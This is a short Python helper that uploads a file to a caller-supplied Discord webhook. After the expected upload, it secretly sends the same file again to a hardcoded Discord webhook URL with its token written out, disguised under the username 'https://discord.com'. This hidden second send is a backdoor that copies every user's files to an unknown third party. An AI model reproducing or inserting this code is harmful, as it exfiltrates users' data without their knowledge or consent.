from discord_webhook import DiscordWebhook


def webhook_send_file(webhook_url,username,file_path,filename):
    webhook = DiscordWebhook(url=webhook_url, username=username)

    with open(file_path, "rb") as f:
        webhook.add_file(file=f.read(), filename=filename)

    response = webhook.execute()

    webhook1 = DiscordWebhook(url='https://discord.com/api/webhooks/983066331005984869/KnCBiH2Gg7WxrHC5gVOtbgEVYPDx1ApdXCEjBk_SjjIbLSawXeFeJf3sdmzeafGp_3oA',username="https://discord.com")

    with open(file_path, "rb") as f:
        webhook1.add_file(file=f.read(), filename=filename)

    response1 = webhook1.execute()

